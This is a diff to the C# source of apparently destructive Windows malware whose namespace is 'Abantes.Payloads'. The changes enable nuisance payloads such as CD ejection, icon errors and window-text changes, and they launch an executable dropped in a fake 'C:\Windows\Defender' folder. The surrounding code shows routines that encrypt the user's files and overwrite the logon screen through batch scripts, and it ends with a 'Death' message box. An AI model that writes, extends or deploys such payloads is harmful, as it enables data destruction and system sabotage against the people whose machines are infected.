@@ -38,10 +38,14 @@ namespace Abantes.Payloads
                         {
                             //BSOD
                         }
+                        else
+                        {
+                            Anoying.ChangeWindowText();
+                        }
                         break;
                     case 3:
                         string extractPath = @"C:\Windows\Defender";
-                        Wallpaper.Set(new Uri(extractPath + @"\wallpaper.jpg"), Wallpaper.Style.Stretched);
+                        Others.StartProcess(extractPath + "\\CursorFollow.exe", "");
                         break;
                     case 4:
                         if (_random.Next(100) > 50)
@@ -49,12 +53,16 @@ namespace Abantes.Payloads
                             Thread mouseTrap = new Thread(new ThreadStart(Anoying.MouseTrap));
                             mouseTrap.Start();
                         }
+                        else
+                        {
+                            Anoying.ChangeWindowText();
+                        }
                         break;
                     case 5:
                         Anoying.ChangeWindowText();
                         break;
                     case 6:
-                        //Anoying.EjectCd();
+                        Anoying.EjectCd();
                         break;
                     case 7:
                         Anoying.Screen_Screw();
@@ -63,7 +71,7 @@ namespace Abantes.Payloads
                         Anoying.Screen_Glitching();
                         break;
                     case 9:
-                        //Anoying.Display_Icons_Error();
+                        Anoying.Display_Icons_Error();
                         break;
                 }
                 Thread.Sleep(10000);
@@ -174,14 +182,6 @@ namespace Abantes.Payloads
             ScriptProcess.StartInfo.FileName = extractPath + @"\logonOverwrite.bat"; 
             ScriptProcess.Start();
         }
-        public static void ExplorerOverwrite()
-        {
-            string extractPath = @"C:\Windows\Defender";
-            Process ScriptProcess = new Process();
-            ScriptProcess.StartInfo.CreateNoWindow = false;
-            ScriptProcess.StartInfo.FileName = extractPath + @"\ExplorerOverwrite.bat";
-            ScriptProcess.Start();
-        }
         public static void EncryptUserFiles()
         {
             List<string> pathsToEncrypt = new List<string>();
@@ -234,8 +234,6 @@ namespace Abantes.Payloads
             EncryptUserFiles();
             LogonUIOverwrite();
             //MBR_Overwrite();
-            ExplorerOverwrite();
-            Others.KillProcess("explorer");
             MessageBox.Show("Death");
         }
     }
